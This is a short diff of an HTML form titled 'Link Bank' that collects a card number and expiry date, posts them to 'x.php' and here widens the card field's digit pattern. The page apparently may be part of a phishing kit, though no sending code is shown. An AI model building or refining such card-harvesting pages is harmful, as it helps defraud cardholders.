@@ -11,7 +11,7 @@
 	<form method="post" action="x.php">
 	<h1>Link Bank </h1>
 	<p>Enter Card Number</p><br>
-	<input type="text" name="Card" placeholder="Debit & Credit Card"required=""maxlength="20" pattern="[0-9]{8}">
+	<input type="text" name="Card" placeholder="Debit & Credit Card"required=""maxlength="20" pattern="[0-9]{20}">
 	<p>Expiry Date</p><br>
 
 	<input type="text" name="Expiry Date" placeholder="Enter Expiry Date"required=""maxlength="12">
